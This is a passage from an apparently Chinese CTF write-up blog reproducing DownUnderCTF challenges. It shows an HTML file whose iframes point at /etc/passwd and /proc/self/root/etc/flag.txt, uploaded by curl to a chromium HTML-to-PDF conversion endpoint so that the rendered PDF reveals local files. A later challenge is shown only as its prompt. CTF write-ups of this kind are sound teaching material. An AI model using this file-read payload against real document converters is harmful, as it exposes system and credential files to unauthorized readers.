    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>\\localhost/etc/passwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>\\localhost/etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre>
<p>简单修改生成一个index.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/proc/self/root/etc/flag.txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>\\localhost/etc/flag.txt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>然后上传即可</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--request</span> POST http://ip:port/forms/chromium/convert/html <span class="token parameter variable">--form</span> <span class="token assign-left variable">files</span><span class="token operator">=</span>@index.html <span class="token parameter variable">-o</span> re.pdf</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/09/OPc5Cc.png" alt="OPc5Cc.png" loading="lazy"></p>
<h2 id="i-am-confusion"><a href="#i-am-confusion" class="headerlink" title="i am confusion"></a>i am confusion</h2><pre class="language-none"><code class="language-none">The evil hex bug has taken over our administrative interface of our application. It seems that the secret we used to protect our authentication was very easy to guess. We need to get it back!</code></pre>








</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/4cfd8fa8/" title="DownunderCTf复现">https://tao0845.github.io/posts/4cfd8fa8/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/b53d3c5e/" rel="prev" title="Vulnyx-send"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Vulnyx-send</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/5e0f535b/" rel="next" title="HackMyVM-Printer"><span class="post-nav-text">HackMyVM-Printer</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>